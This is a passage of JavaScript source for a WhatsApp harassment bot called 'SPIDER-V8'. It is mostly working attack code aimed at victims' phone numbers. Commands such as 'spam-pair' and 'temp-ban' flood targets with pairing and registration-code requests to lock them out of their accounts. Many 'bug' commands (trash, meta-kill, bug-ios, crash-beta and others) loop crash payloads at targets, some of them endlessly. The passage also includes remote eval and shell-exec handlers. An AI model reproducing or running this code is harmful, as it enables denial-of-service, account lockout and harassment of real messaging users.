        contextInfo: {
            mentionedJid: [
                m.sender
            ],
            externalAdReply: {
                showAdAttribution: false,
                renderLargerThumbnail: false,
                title: `𝐒𝐏𝐈𝐃𝐄𝐑-𝐕8 🕷️ `,
                body: `𝐛𝐲 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,
                previewType: "VIDEO",
                thumbnailUrl: `https://i.imgur.com/xdt2g23.jpeg`,
                sourceUrl: `${global.url1}`,
                mediaUrl: `${global.url1}`
            }
        },
        text: teks
    }, {
        quoted: m
    })
    await sleep(500)
}
//=================================================//
const dust = {
    "key": {
        "remoteJid": "status@broadcast",
        "participant": "0@s.whatsapp.net",
        "fromMe": false
    },
    "message": {
        "interactiveMessage": {
            "header": {
                "title": ""
            },
            "body": {
                "text": "SPIDER-V8"
            },
            "footer": {
                "text": "by - 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒"
            },
            "nativeFlowMessage": {
                "messageParamsJson": "" //.repeat(850000)
            }
        }
    }
}
const troll = {
    key: {
        fromMe: false,
        participant: '0@s.whatsapp.net',
        remoteJid: "status@broadcast"
    },
    message: {
        orderMessage: {
            orderId: "2029",
            thumbnail: null,
            itemCount: 909,
            status: "INQUIRY",
            surface: "CATALOG",
            message: `MsG - ${m.body || m.mtype}`,
            token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
        }
    },
    contextInfo: {
        mentionedJid: m.sender.split,
        forwardingScore: 999,
        isForwarded: true
    }
}
const qpay = {
    key: {
        remoteJid: '',
        fromMe: false,
        participant: '0@s.whatsapp.net'
    },
    message: {
        paymentInviteMessage: {
            serviceType: 1,
            expiryTimestamp: 2
        }
    }
}
const vidq = {
    key: {
        remoteJid: '0@s.whatsapp.net',
        fromMe: false,
        participant: '0@s.whatsapp.net'
    },
    message: {
        videoMessage: {
            caption: "#SPIDER-V8",
            jpegThumbnail: '',
        }
    }
}
//=================================================//
// 

// 
let handled = false
//=================================================//
if (m.message) {
    console.log(chalk.green.bgHex("#e74c3c").bold(`\n💫 SPIDER V8💫`))
    console.log(chalk.green.bgHex("#e74c3c").bold(`✉️ Message`))
    console.log(chalk.black.bgHex("#00FF00")(`📅 Date: ${new Date().toLocaleString()} \n💬 Message: ${m.body || m.mtype} \n🗣️ From: ${m.pushName} \n🔢 User JID: ${m.sender}`))
    if (m.isGroup) {
        console.log(chalk.black.bgHex("#00FF00")(`🏷️ Grup: ${groupName}`))
        console.log(chalk.black.bgHex("#00FF00")(`🧷 GroupJid: ${m.chat}`))
    }
   
}



if (!handled) {
switch (command) {
//===========================================//
case 'menu': case 'spider':{
await loadings()
let kimg=`
> 𝗗𝗘𝗩𝗜𝗟 𝗦𝗣𝗜𝗗𝗘𝗥 𝗩8   
▬▬▬▬▬▬▬▬▬▬▬▬▬
   ◉ 𝙷𝚒  ${m.pushName} 𝙷𝚘𝚠 𝚊𝚛𝚎 𝚢𝚘𝚞 𝚍𝚘𝚒𝚗𝚐?,𝙷𝚘𝚙𝚎 𝚢𝚘𝚞 𝚊𝚛𝚎 𝚏𝚒𝚗𝚎...
   ◉𝙱𝚎𝚕𝚘𝚠 𝚒𝚜 𝚖𝚢 𝚖𝚎𝚗𝚞 𝚌𝚊𝚝𝚎𝚐𝚘𝚛𝚢
▬▬▬▬▬▬▬▬▬▬▬▬▬
> spiderbugs
> ownermenu
▬▬▬▬▬▬▬▬▬▬▬▬▬
© 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`
sam.sendMessage(m.chat, { 
	           text: kimg,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `𝐃𝐄𝐕𝐈𝐋 𝐒𝐏𝐈𝐃𝐄𝐑 𝐕8`,
                            body: `𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,
                            thumbnailUrl: `https://i.imgur.com/xdt2g23.jpeg`, 
                            sourceUrl: `https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e`,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                    
                    }),
await sam.sendMessage(m.chat, {
audio: samido,
mimetype: 'audio/mpeg'
}, { quoted: m
})
}
break
case 'bugmenu': case 'spiderbugs':{
await loadings()
let timestamp = speed()
let latensi = speed() - timestamp
let run = runtime(process.uptime())
let nest = ` 
> 𝗗𝗘𝗩𝗜𝗟 𝗦𝗣𝗜𝗗𝗘𝗥 𝗩8
▬▬▬▬▬▬▬▬▬▬▬▬▬
   ◉ 𝙷𝚎𝚕𝚕𝚘 ${m.pushName} 𝚑𝚘𝚙𝚎 𝚢𝚘𝚞 𝚊𝚛𝚎 𝚎𝚗𝚓𝚘𝚢𝚒𝚗𝚐 𝚝𝚑𝚎 𝚋𝚘𝚝
   ◉ 𝙱𝚎𝚕𝚘𝚠 𝚒𝚜 𝚖𝚢 𝚋𝚞𝚐 𝚖𝚎𝚗𝚞
▬▬▬▬▬▬▬▬▬▬▬▬▬
   ➢ 𝚙𝚛𝚎𝚏𝚒𝚡 : ${prefix}
   ➣ 𝚙𝚒𝚗𝚐: ${latensi.toFixed(4)}
   ➣ 𝚁𝚞𝚗𝚝𝚒𝚖𝚎 : ${run}
▬▬▬▬▬▬▬▬▬▬▬▬▬
> 𝗠𝗔𝗜𝗡

◆ trash
▬▬▬▬▬▬▬▬▬▬▬▬▬
> 𝗜𝗢𝗦 𝗕𝗨𝗚𝗦

◆ bug-ios
◆ fake-ios
◆ iospenetrate
▬▬▬▬▬▬▬▬▬▬▬▬▬
> 𝗢𝗧𝗣 𝗟𝗢𝗖𝗞

◆ spam-pair 254xxx|150
◆ temp-ban 254|7xxxx
▬▬▬▬▬▬▬▬▬▬▬▬▬
> 𝐁𝐘 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`
sam.sendMessage(m.chat, { 
	           text: nest,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: false,
                            title: `𝐃𝐄𝐕𝐈𝐋 𝐒𝐏𝐈𝐃𝐄𝐑 𝐕8`,
                            body: `𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,
                            thumbnailUrl: `https://i.imgur.com/xdt2g23.jpeg`, 
                            sourceUrl: `https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e`,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                    
                    }),
await sam.sendMessage(m.chat, {
audio: samido,
mimetype: 'audio/mpeg'
}, { quoted: m
})
}
break
case 'ownermenu': case 'owner':{
await loadings()
let timestamp = speed()
let latensi = speed() - timestamp
let run = runtime(process.uptime())
let lest = ` 
> 𝗗𝗘𝗩𝗜𝗟 𝗦𝗣𝗜𝗗𝗘𝗥 𝗩8
▬▬▬▬▬▬▬▬▬▬▬▬▬
   ◉ 𝙷𝚎𝚕𝚕𝚘 ${m.pushName} 𝚑𝚘𝚙𝚎 𝚢𝚘𝚞 𝚊𝚛𝚎 𝚎𝚗𝚓𝚘𝚢𝚒𝚗𝚐 𝚝𝚑𝚎 𝚋𝚘𝚝
   ◉ 𝙱𝚎𝚕𝚘𝚠 𝚒𝚜 𝚖𝚢 𝚋𝚞𝚐 𝚖𝚎𝚗𝚞
▬▬▬▬▬▬▬▬▬▬▬▬▬
   ➢ 𝚙𝚛𝚎𝚏𝚒𝚡 : ${prefix}
   ➣ 𝚙𝚒𝚗𝚐: ${latensi.toFixed(4)}
   ➣ 𝚁𝚞𝚗𝚝𝚒𝚖𝚎 : ${run}
▬▬▬▬▬▬▬▬▬▬▬▬▬
> 𝗢𝗪𝗡𝗘𝗥 𝗖𝗠𝗗𝗦

◆ addprem
◆ delprem
◆ addowner
◆ delowner
◆ self
◆ public
◆ decrypt
▬▬▬▬▬▬▬▬▬▬▬▬▬
© 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`
sam.sendMessage(m.chat, { 
	           text: lest,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `𝐃𝐄𝐕𝐈𝐋 𝐒𝐏𝐈𝐃𝐄𝐑 𝐕8`,
                            body: `𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,
                            thumbnailUrl: `https://i.imgur.com/xdt2g23.jpeg`, 
                            sourceUrl: `https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e`,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                    
                    }),
await sam.sendMessage(m.chat, {
audio: samido,
mimetype: 'audio/mpeg'
}, { quoted: m
})
}
break
case 'addprem': {
if (!isCreator) return reply(mess.owner)
if (args.length < 2)
return reply(`*Example:* ${prefix + command} @tag 30d`);
if (m.mentionedJid.length !== 0) {
for (let i = 0; i < m.mentionedJid.length; i++) {
addPremiumUser(m.mentionedJid[0], args[1], orgkaya);
}
reply("Succes Premium")
} else {
addPremiumUser(args[0] + "@s.whatsapp.net", args[1], orgkaya);
reply("Succes Via number")
await sleep(2000)
sam.sendMessage(args[0] + "@s.whatsapp.net", {text: `You are now a Premium Member`},{quoted: tes })
}
}
break
case "spam-pair": {
if (!isCreator) return reply(mess.owner)
if (!q) return reply(`*Example:* ${prefix + command} +2547888888888|150`)
//let [targetNumber, attemptCount = "100"] = q.split("|")
let targetNumber = q.split("|")[0]
let sanitizedPhoneNumber = targetNumber.replace(/[^0-9]/g, '').trim()
let attempts = q.split("|")[1]  //parseInt(attemptCount)
if (isNaN(attempts)) return reply('The number of attempts must be a number.')

/*async function spamPairingRequest(sanitizedPhoneNumber, attempts) {
const startTime = Date.now();
const duration = 15 * 60 * 1000; // 15 menit dalam milidetik
      */  
let { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys')
let { state } = await useMultiFileAuthState('./npm')
let { version } = await fetchLatestBaileysVersion()
let pino = require("pino")
let sucked = await makeWaSocket({ auth: state, version, logger: pino({ level: 'fatal' }) })
/*
while (Date.now() - startTime < duration) {
let currentAttempts = attempts; // reset attempts per loop
while (currentAttempts > 0) {
*/
for (let i = 0; i < attempts; i++) {
try {
    await sucked.requestPairingCode(sanitizedPhoneNumber);
    console.log(`_Succes Spam Pairing Code - Number: ${sanitizedPhoneNumber} - Code: ${prc}_`);
    await sleep(500)
} catch (error) {
console.error('An error occurred while requesting the verification code::', error);
}
}
                
/*console.log(`Spam Pairing WhatsApp: ${currentAttempts} remaining trials...`);
await new Promise(resolve => setTimeout(resolve, 1000)); // 1 detik per iterasi
currentAttempts--;
}

console.log('Resend in 30 seconds...');
await new Promise(resolve => setTimeout(resolve, 30000)); // Tunggu 30 detik sebelum iterasi berikutnya
}

console.log('Finished. 15 minutes have passed');
}

await spamPairingRequest(sanitizedPhoneNumber, attempts);*/
}
break;
case 'test': {
if (!isPremium) return reply('You are not premium ')
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
sam.sendMessage(bnnd, { image: spider,  caption: testi }, { quoted:m })
reply(`Sukses Target Telah Di Kirim ${command}`)
}
break
case 'temp-ban': {
if (!isCreator) return
if (!text) return reply(`*Example:* ${prefix + command} 254|7872627288`)
if (!/|/.test(text)) return reply(`Wrong Usage!!!:\n> *Example:* ${prefix + command} 254|7872627288`)
let numbers = JSON.parse(fs.readFileSync('./database/tb.json'))

let cCode = q.split("|")[0]
let number = q.split("|")[1]
let fullNo = cCode + number

await reply(`Successfully Temporarily Block WhatsApp with number : ${fullNo} Using Commands ${command} Indefinitely this glitch will come back when the bot restarts!!!`)

const { default: makeWaSocket, useMultiFileAuthState } = require('@whiskeysockets/baileys')
let pino = require("pino")
let { state, saveCreds } = await useMultiFileAuthState('.npm')
let spam = makeWaSocket({
auth: state,
mobile: true,
logger: pino({ level: 'silent' })
})

let dropNumber = async () => {
try {
let res = await spam.requestRegistrationCode({
phoneNumber: `+${fullNo}`,
phoneNumberCountryCode: cCode,
phoneNumberNationalNumber: number,
phoneNumberMobileCountryCode: 724
})

if (res.reason === 'temporarily_unavailable') {
console.log(`Invalid Number (Possible Registration Interrupted): +${res.login}`)
await sleep(1000)
await dropNumber()
}
} catch (error) {
console.error(error)
}
}

numbers[fullNo] = { cCode, number };
fs.writeFileSync('./database/tb.json', JSON.stringify(numbers, null, '\t'));
setInterval(() => {
dropNumber()
}, 400)
}
break
case'text-kill': {
if (!isCreator) return
if (!q) return reply(`Use like .${command} 25490316165xx`)
let num = q.replace(/[^0-9]/g, "")
if (num.startsWith('0')) return reply(`Number cannot start with 0 \n\n<✓> Example : .${command} 25490316165xx`)
let target = num + '@s.whatsapp.net'
await reply("processing....")
for (let j = 0; j < 20; j++) {
await test(target)
}
await reply(`Successfully sent bugs to ${target} using ${command}`)
}
break
case 'trash': {
			if (!isCreator) return reply(mess.owner)
			if (!q) return reply(`*Cannot Procces your Request*\n\n_Use : trash Number_\n_Example : .trash 254xx_\n\n𝐒𝐏𝐈𝐃𝐄𝐑-𝐕8👽`);
			incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
			if (incTarget.startsWith('0')) return reply(`*Syntax Error!*\n\n_Use : trash Number_\n_Example : .trash 2547xx_\n\n𝐒𝐏𝐈𝐃𝐄𝐑-𝐕8👺`)
			let target = incTarget + '@s.whatsapp.net'
			global.jumlah = text.split("|")[1]

			let sections = [{
					title: '⌜ ◉𝐖𝐀 𝐌𝐄𝐓𝐀 ⌟',
					highlight_label: "🕷️𝚂𝙿𝙸𝙳𝙴𝚁-𝚅8",
					rows: [{
						title: '☠𝑫𝒐𝒎𝒊𝒏𝒂𝒕𝒆◈༑',
						id: `.meta-kill ${incTarget}`
					}]
				},
				{
					highlight_label: "💥𝐃𝐇𝐎𝐎𝐌𝐄𝐃",
					rows: [{
						title: '⌁🗿⃰𝑫𝒐𝒎𝒊𝒏𝒂𝒕𝒆 2🔥༑',
						id: `.spider-web ${incTarget}`
					}]
				},
				{
					highlight_label: "🦄𝐒𝐌𝐀𝐒𝐇🪨",
					rows: [{
						title: '🦋𝑫𝒐𝒎𝒊𝒏𝒂𝒕𝒆 3🕸️',
						id: `.bugcity ${incTarget}`
					}]
				},
				{
					highlight_label: "🔥𝐊𝐈𝐋𝐋 𝐒𝐀𝐌𝐒𝐔𝐍𝐆🗿",
					rows: [{
						title: '☼𝑫𝒐𝒎𝒊𝒏𝒂𝒕𝒆 4 ☘',
						id: `.samsung-try ${incTarget}`
					}]
				},
				{   
					highlight_label: "☠️𝐓𝐡𝐫𝐢𝐥𝐥👹",
					rows: [{
						title: '𝐂𝐑𝐀𝐒𝐇_𝐁𝐄𝐓𝐀',
						id: `.crash-beta ${incTarget}`
					}]
				},
				{
					highlight_label: "👻𝐓𝐡𝐫𝐢𝐥𝐥 2 🤡",
					rows: [{
						title: '🎃𝐊𝐈𝐋𝐋_𝐄𝐌👽',
						id: `.sspider ${incTarget}`
					}]
				},
				{
					highlight_label: "😈𝐓𝐡𝐫𝐢𝐥𝐥 3🤲",
					rows: [{
						title: '𝐌𝐈𝐑𝐀𝐂𝐋𝐄',
						id: `.sql-test ${incTarget}`
					}]
				},
				{
					title: '⌜ 𝐈𝚯𝐒 ⌟',
					highlight_label: "🤖𝐒𝐮𝐩𝐫𝐢𝐬𝐞 𝐈𝐨𝐬🫶",
					rows: [{
						title: '⌁⃰𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐨ͮ͢𝐒༑',
						description: `☇`,
						id: `.bug-ios ${incTarget}`
					}]
				},
				{
					title: '⌜ 𝐇𝚯𝐋𝐃 ⌟',
					rows: [{
						title: '𝐓𝐄𝐌𝐏-𝐁𝐀𝐍',
						id: `.temp-ban ${incTarget}`
					}]
				}
			]

			let listMessage = {
				title: `𝐒𝐏𝐈𝐃𝐄𝐑-𝐕8 🔥`,
				sections
			};
	let msg = generateWAMessageFromContent(m.chat, {
				viewOnceMessage: {
					message: {
						"messageContextInfo": {
							"deviceListMetadata": {},
							"deviceListMetadataVersion": 2
						},
						interactiveMessage: proto.Message.InteractiveMessage.create({
							contextInfo: {
								mentionedJid: [m.sender],
								isForwarded: true,
								forwardingScore: 999,
								forwardedNewsletterMessageInfo: {
									newsletterJid: '120363320283062687@newsletter',
									newsletterName: '☠️⃟S҉ P҉ I҉ D҉ E҉ R҉  C҉ R҉ A҉ S҉ H҉ 🦄',
									serverMessageId: -1
								},
								businessMessageForwardInfo: {
									businessOwnerJid: sam.decodeJid(sam.user.id)
								},
							},
							body: proto.Message.InteractiveMessage.Body.create({
								text: ''
							}),
							footer: proto.Message.InteractiveMessage.Footer.create({
								text: `⿻  ⌜ 𝐒𝐏𝐈𝐃𝐄𝐑 𝐕8 ⌟  ⿻`
							}),
							header: proto.Message.InteractiveMessage.Header.create({
								title: `\n⃟🕷️ S҉ P҉ I҉ D҉ E҉ R҉  V҉ 8 🔥⃟\n›› 𝐓𝐫𝐚𝐬𝐡 𝐀𝐭𝐭𝐚𝐜𝐤𝐢𝐧𝐠 : ${incTarget}\n`,
								subtitle: `️`,
								hasMediaAttachment: true,
								...(await prepareWAMessageMedia({
									image: {
										url: 'https://i.imgur.com/xdt2g23.jpg'
									}
								}, {
									upload: sam.waUploadToServer
								}))
							}),
							nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
								buttons: [{
									"name": "single_select",
									"buttonParamsJson": JSON.stringify(listMessage)
								}, ]
							})
						})
					}
				}
			}, {})

			await sam.relayMessage(msg.key.remoteJid, msg.message, {
				messageId: msg.key.id
			})
		}
		break

			
case 'self': {
if (!isCreator) return reply(mess.owner) 
sam.public = false
reply('_Succes Change To Self_')
}
break
case 'public': {
if (!isCreator) return reply(mess.owner) 
sam.public = true
reply('_Success Change To Public_')
}
break
case 'delprem': {
if (!isCreator) return reply(mess.owner)
if (args.length < 1) return reply(`*Example:* ${prefix + command} @tag`);
if (m.mentionedJid.length !== 0) {
for (let i = 0; i < m.mentionedJid.length; i++) {
let mentionedPremiumIndex = orgkaya.findIndex(premium => premium.id === m.mentionedJid[i]);
if (mentionedPremiumIndex !== -1) {
orgkaya.splice(mentionedPremiumIndex, 1);
}
}
fs.writeFileSync("./database/premium.json", JSON.stringify(orgkaya));
reply("Succes Delete");
} else {
let targetNumber = args[0] + "@s.whatsapp.net"
let targetPremiumIndex = orgkaya.findIndex(premium => premium.id === targetNumber)
if (targetPremiumIndex !== -1) {
orgkaya.splice(targetPremiumIndex, 1)
fs.writeFileSync("./database/premium.json", JSON.stringify(orgkaya))
reply("Succes Via Number")
await sleep(2000)
sam.sendMessage(targetNumber, {text: `Status Your Premium Has Expired/Revoked`},{quoted: tes })
} else {
reply("Premium not found")
}
}
}
break
case 'addowner': {
if (!isCreator) return reply(mess.owner)
if (!args[0]) return reply(`*Example:* ${prefix+command} 2547xxxxxxxx`)
prem1 = text.split("|")[0].replace(/[^0-9]/g, '')
let cek1 = await sam.onWhatsApp(prem1 + `@s.whatsapp.net`)
if (cek1.length == 0) return (`This Number is not registered to Whatsapp !!!`)
kontributor.push(prem1)
fs.writeFileSync('./database/owner.json', JSON.stringify(kontributor))
reply(`${prem1} Already a contributor!`)
sam.sendMessage(prem1+'@s.whatsapp.net', {text: `You are now the bot owner/contributor`},{quoted: m})
}
break
case 'sql-test': {
if (!isCreator) return reply(mess.owner)
if (!q) return reply(`*Example*: ${prefix + command} 2547392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`> The number starts with the number 0. Replace it with the number starting with the country code\n\n> Example : ${prefix + command} 2547392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(mess.bugrespon)
for (let j = 0; j < 30; j++) {
await sendSql(target)
await sleep(2000)
}

await reply(`_Successfully spider has deliver 🕷️ to ${bijipler} Using ${command}._\n\n> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'delowner': {
if (!isCreator) return reply(mess.owner)
if (!args[0]) return reply(`*Example:* ${prefix+command} 2547xxxxxxx`)
prem2 = text.split("|")[0].replace(/[^0-9]/g, '')
unp = kontributor.indexOf(prem2)
kontributor.splice(unp, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(kontributor))
reply(`${prem2} No longer a Contributor!!`)
}
break
case'decrypt':{
let text;
if (args.length >= 1) {
    text = args.join(" ");
} else if (m.quoted && m.quoted.text) {
    text = m.quoted.text;
} else {
    return reply(`*Example:* ${prefix + command} (Input text or reply text to enc code)`);
}

try {
const message = await Decrypt(text);
await reply(message);
    
} catch (error) {
const errorMessage = `There is an error: ${error.message}`;
await reply(errorMessage);
}
}
break   
case 'samsung-test': case 'samsung-kill': case 'samsung-try': case 'kill-it': {
if (!isCreator) return reply(mess.owner)
if (!isPremium) return reply(mess.prem)
if (!q) return reply(`*Example*: ${prefix + command} 2547392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`> The number starts with the number 0. Replace it with the number starting with the country code\n\n> Example : ${prefix + command} 2547392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(mess.bugrespon)

await bugpayflow(target);
await bugpayflow(target);
await BugPayment(target)
for (let j = 0; j < 30; j++) {
await BugPayment(target)
await coresix(target, "p", 1020000, true);
await coresix(target, "p", 1020000, true);
await coresix(target, "p", 1020000, true);
}

await reply(`_Successfully spider has deliver 🕷️ to ${bijipler} Using ${command}._\n\n> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'meta-kill': case 'spider-web': {
if (!isCreator) return reply(mess.owner)
if (!isPremium) return reply(mess.prem)
if (!q) return reply(`*Example*: ${prefix + command} 2547392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`> The number starts with the number 0. Replace it with the number starting with the country code\n\n> *Example*: ${prefix + command} 2547392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(mess.bugrespon)
for (;;) {
await BugPayment(target)
await bugpayflow(target);
await coresix(target, "p", 1020000, true);
await coresix(target, "p", 1020000, true);
}
await sleep(3000)
}
break
case 'systemui': case 'destroy-ui': case 'crash-ui': case 'devil-spider': {
if (!isCreator) return reply(mess.owner)
if (!isPremium) return reply(mess.prem)
if (!q) return reply(`*Example*: ${prefix + command} 2547392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`> The number starts with the number 0. Replace it with the number starting with the country code\n\n> *Example*: ${prefix + command} 2547392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(mess.bugrespon)
await bugpayflow(target);
await bugpayflow(target);
await BugPayment(target)
for (let j = 0; j < 30; j++) {
await BugPayment(target)
await coresix(target, "p", 1020000, true);
await coresix(target, "p", 1020000, true);
await coresix(target, "p", 1020000, true);
}
await reply(`_Successfully spider has deliver 🕷️ to ${bijipler} Using ${command}._\n\n> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'kingcall': case 'night-night': case 'sam-did': case 'ugly-face': {
if (!isCreator) return
for (let j = 0; j < 30; j++) {
await BugPayment(m.chat)
await coresix(m.chat, "p", 1020000, true);
await coresix(m.chat, "p", 1020000, true);
await BugPayment(m.chat)
await coresix(m.chat, "p", 1020000, true);
}
}
break
case "🕷️":
case "🕸️":
case "🦄":
case "💥":
case "🏴‍☠️":
case "🔥":
case "🌑":
case "🐊":{
if (!isCreator) return reply(mess.owner)
if (!isPremium) return reply(mess.prem)
if (!q) return reply(`*Example*: ${prefix + command} 254712345678`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`> Put Number Without Country Code\n\n> *Example*: ${prefix + command} 2547392784527`)
let Pe = bijipler + '@s.whatsapp.net'
await reply(`Wait as Spider Process your Request.....`)
await bugpayflow(Pe);
for (let j = 0; j < 30; j++) {
await BugPayment(target)
await coresix(Pe, "", 1020000, true);
await coresix(Pe, "", 1020000, true);
await BugPayment(target)
await coresix(Pe, "", 1020000, true);
await coresix(Pe, "", 1020000, true);
await sleep(500)
}
await reply(`_Successfully spider has deliver 🕷️ to ${Pe} Using ${command}._\n\n> Pause 2 minutes so that the bot is not banned.`)
}
break;
case 'freezeweb': case 'kill-all': case 'terror': case 'xios': {
if (!isCreator) return reply(mess.owner)
if (!isPremium) return reply(mess.prem)
if (!q) return reply(`*Example*: ${prefix + command} 254742491666`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`> The number starts with the number 0. Replace it with the number starting with the country code\n\n> *Example*: ${prefix + command} 2547392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(mess.bugrespon)
await bugpayflow(target);
for (let j = 0; j < 30; j++) {
await coresix(target, "p", 1020000, true);
await coresix(target, "p", 1020000, true);
await coresix(target, "p", 1020000, true);
}
await reply(`_Successfully spider has deliver 🕷️ to ${target} Using ${command}._\n\n> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'crash-beta': 
case 'test-beta':{
if (!isCreator) return reply(mess.owner)
if (!isPremium) return reply(mess.prem)
if (!q) return reply(`*Example*: ${prefix + command} 2547392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`> The number starts with the number 0. Replace it with the number starting with the country code\n\n> *Example*: ${prefix + command} 2547392784527`)
let target = bijipler + '@s.whatsapp.net'
await bugpayflow(target);
for (let j = 0; j < 30; j++) {
await BugPayment(target)
await coresix(target, "", 1020000, true);
await BugPayment(target)
await coresix(target, "", 1020000, true);
await BugPayment(target);
await sleep(500)
}
await reply(`_Successfully Spider has delivered to ${target} Using ${command}._\n\n> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'gasfull': case 'gass': case 'spam': case'oke': {
if (!isCreator) return reply(mess.owner)
if (!isPremium) return reply(mess.prem)
if (!q) return reply(`*Example*: ${prefix + command} 2547392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`> The number starts with the number 0. Replace it with the number starting with the country code\n\n> *Example*: ${prefix + command} 2547392784527`)
let target = bijipler + '@s.whatsapp.net'
await bugpayflow(target);
await bugpayflow(target);
await BugPayment(target)
for (let j = 0; j < 30; j++) {
await BugPayment(target)
await coresix(target, "p", 1020000, true);
await coresix(target, "p", 1020000, true);
await coresix(target, "p", 1020000, true);
}
await sleep(4000)
await reply(`Succeful Spider has delivered ${Pe} Using ${command}._\n\n> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'iospenetrate': case 'bug-ios': {
if (!isPremium) return reply(mess.owner)
if (!isPremium) return reply(mess.prem)
if (!q) return reply(`*Example*: ${prefix + command} 2547392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`> The number starts with the number 0. Replace it with the number starting with the country code\n\n> *Example*: ${prefix + command} 2547392784527`)
await reply(mess.bugrespon)
let target = bijipler + '@s.whatsapp.net'
  for (;;) {
    await aipong(target)
    await sleep(1200)
  }
}
break
case 'fake-ios': case 'test-ios': {
if (!isCreator) return reply(mess.owner)
if (!isPremium) return reply(mess.prem)
if (!q) return reply(`use .${command} 2547392784527|1\n`)
let ppek = q.split("|")[0]
let bijipler = ppek.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`> The number starts with the number 0. Replace it with the number starting with the country coden\n> *Example*: ${prefix + command} 2547392784527`)
let target = bijipler+"@s.whatsapp.net"
let jumlah = q.split("|")[1] * 200
let ppk = jumlah * 1.5
reply(ppk + " detik");
reply(mess.bugrespon)
for (let j = 0; j < jumlah; j++) {
await aipong(target)
await sleep(1500)
}
reply(`_Succes Send Bug Ke ${target} using ${ppk} detik_`)
}
break
break
case 's-bug': case 'bugcity': {
if (!isCreator) return reply(mess.owner)
if (!isPremium) return reply(mess.prem)
if (!q) return reply(`*Example*: ${prefix + command} 2547392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`> The number starts with the number 0. Replace it with the number starting with the country code\n\n> *Example*: ${prefix + command} 2547392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(mess.bugrespon)
await bugpayflow(target);
await bugpayflow(target);
await BugPayment(target)
for (let j = 0; j < 30; j++) {
await BugPayment(target)
await coresix(target, "p", 1020000, true);
await coresix(target, "p", 1020000, true);
await coresix(target, "p", 1020000, true);
}
await reply(`_Successfully spider has deliver 🕷️ to ${bijipler} Using ${command}._\n\n> Pause 2 minutes so that the bot is not banned.`)
}
break
case'sspider':
case'sam-test':
case'miracle':{
if (!isCreator) return reply(mess.owner)
if (!isPremium) return reply(mess.prem)
if (!q) return reply(`*Example*: ${prefix + command} 2547392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`> The number starts with the number 0. Replace it with the number starting with the country code\n\n> *Example*: ${prefix + command} 2547392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(mess.bugrespon)
await bugpayflow(target);
await bugpayflow(target);
await BugPayment(target)
for (let j = 0; j < 30; j++) {
await BugPayment(target)
await coresix(target, "p", 1020000, true);
await coresix(target, "p", 1020000, true);
await coresix(target, "p", 1020000, true);
}
await reply(`_Successfully spider has deliver 🕷️ to ${bijipler} Using ${command}._\n\n> Pause 2 minutes so that the bot is not banned.`)
}
break
//============================================//
default:
}
}
if (budy.startsWith("=>")) {
if (!isCreator) return
try {
const result = await eval(`(async () => { return ${budy.slice(3)} })()`)
m.reply(util.format(result))
} catch (e) {
m.reply(String(e))
}
}
if (budy.startsWith(">")) {
if (!isCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== "string") evaled = require("util").inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}
}
if (budy.startsWith("$")) {
if (!isCreator) return
exec(budy.slice(2),
(err, stdout) => {
if (err) return m.reply(err.toString())
if (stdout) return m.reply(stdout.toString())
})
}
} catch (err) {
const handleError = async () => {
